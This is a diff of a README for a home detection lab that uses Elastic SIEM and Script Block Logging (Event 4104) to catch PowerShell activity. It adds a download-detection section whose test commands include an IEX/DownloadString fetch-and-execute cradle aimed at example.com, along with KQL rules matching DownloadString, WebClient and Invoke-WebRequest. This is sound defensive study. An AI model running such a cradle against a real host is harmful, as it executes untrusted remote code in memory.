@@ -19,6 +19,8 @@ Logs from Windows systems are ingested into Elastic SIEM for analysis and detect
 
 ## PowerShell Detection Labs
 
+---
+
 ### 🔹 Encoded PowerShell Command Detection
 
 Test Command:
@@ -76,14 +78,92 @@ and powershell.file.script_block_text: *ExecutionPolicy*
 
 ---
 
-## Key Learnings
+### 🔹 PowerShell Download Detection (Web Requests)
 
-- PowerShell Script Block Logging (Event ID 4104) captures executed script content
-- Encoded PowerShell commands (`-enc`) are logged in decoded form
-- Base64 encoding is not encryption, only obfuscation
-- Not all PowerShell commands generate meaningful detection signals
-- Effective detection requires query tuning and validation
-- KQL behavior varies with wildcards, quotes, and tokenization
+Test Commands:
+```powershell
+Invoke-WebRequest http://example.com
+```
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("https://example.com")
+```
+
+Observed Behavior:
+- PowerShell initiated outbound web requests
+- Remote content was retrieved and/or executed in memory
+- Script Block Logging (4104) captured the full command
+
+Example Log:
+```text
+Invoke-WebRequest http://example.com
+```
+
+or
+
+```text
+IEX (New-Object Net.WebClient).DownloadString("https://example.com")
+```
+
+---
+
+### Detection Rule (Elastic)
+
+```kql
+event.code: "4104" AND powershell.file.script_block_text: ("*DownloadString*" OR "*Invoke-WebRequest*")
+```
+
+Rule Configuration:
+- Name: download detection  
+- Severity: Medium  
+- Risk Score: 50  
+- Interval: 1 minute  
+- Lookback: 5 minutes  
+
+---
+
+### ✅ Validation
+
+- Detection rule triggered successfully after executing test commands
+- Alert contained:
+  - correct host (`desktopwin11`)
+  - correct user (`User1`)
+  - correct script content
+
+Example Alert Context:
+```text
+Invoke-WebRequest http://example.com
+```
+
+---
+
+## Key Concepts Learned
+
+### 🔹 Script Block Logging (Event ID 4104)
+
+- Logs **actual PowerShell code executed**
+- Captures commands **after parsing and decoding**
+- Provides visibility into:
+  - encoded commands
+  - obfuscated scripts
+  - dynamically generated code
+
+---
+
+### 🔹 Command Line vs Execution Visibility
+
+| Log Type | Purpose |
+|--------|--------|
+| Event 4688 | Shows how PowerShell was launched (e.g. `-EncodedCommand`) |
+| Event 4104 | Shows what actually executed ✅ |
+
+---
+
+### 🔹 Obfuscation Insight
+
+- Base64 encoding hides commands from humans and simple detections
+- Script Block Logging reveals decoded content
+- Effective detections rely on **behavior, not raw input**
 
 ---
 
@@ -91,47 +171,27 @@ and powershell.file.script_block_text: *ExecutionPolicy*
 
 - Start with broad queries (`event.code: 4104`) before refining
 - Validate detection logic using actual log data
-- Focus on high-signal behaviors (IEX, execution policy bypass, encoded commands)
-- Avoid relying on exact string matches without verifying field format
+- Focus on behavioral patterns rather than exact commands
+- Avoid overly specific detections (e.g. matching only `whoami`)
+- Combine multiple detection layers when possible
+
+---
+
+## Key Learnings
+
+- PowerShell Script Block Logging (4104) is critical for detecting obfuscated activity  
+- Encoded commands (`-enc`) are logged in decoded form  
+- Detection rules should focus on **patterns of behavior**  
+- Real detections may generate multiple alerts for a single action  
+- Tuning is required to balance signal vs noise  
+- Correlating multiple log sources improves detection accuracy  
 
 ---
 
 ## Next Steps
 
-- Detect PowerShell download activity (DownloadString / Invoke-WebRequest)
-- Build Kibana alert rules for suspicious command execution
-- Expand detection coverage for common attack techniques
-
-- ---
-
-### 🔹 PowerShell Download Detection (WebClient)
-
-Test Command:
-```powershell
-IEX (New-Object Net.WebClient).DownloadString("https://example.com")
-```
-
-Observed Behavior:
-- PowerShell downloaded remote content and executed it dynamically in memory
-
-Detection:
-- Event ID: 4104 captured the full command
-- Script block shows:
-
-```powershell
-IEX (New-Object Net.WebClient).DownloadString("https://example.com")
-```
-
-Detection Query:
-```kql
-event.dataset: "windows.powershell_operational"
-and event.code: 4104
-and (
-  powershell.file.script_block_text: *DownloadString*
-  or powershell.file.script_block_text: *WebClient*
-)
-```
-
----
-
-
+- Detect encoded PowerShell using command-line logs (Event ID 4688)
+- Correlate command-line execution with script block logging
+- Expand detection coverage for additional attack techniques
+- Continue refining rules to reduce false positives
+``
